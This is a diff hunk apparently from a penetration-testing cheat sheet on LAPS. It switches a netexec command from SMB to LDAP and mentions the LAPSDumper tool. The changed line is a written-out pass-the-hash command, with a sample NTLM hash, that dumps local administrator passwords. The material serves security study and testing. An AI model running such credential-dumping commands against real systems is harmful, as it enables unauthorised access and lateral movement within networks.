@@ -63,7 +63,7 @@ Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
      
    * [netexec](https://github.com/Pennyw0rth/NetExec):
        ```bash
-       netexec smb 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps
+       netexec ldap 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps
        ```
 
    * [LAPSDumper](https://github.com/n00py/LAPSDumper) 
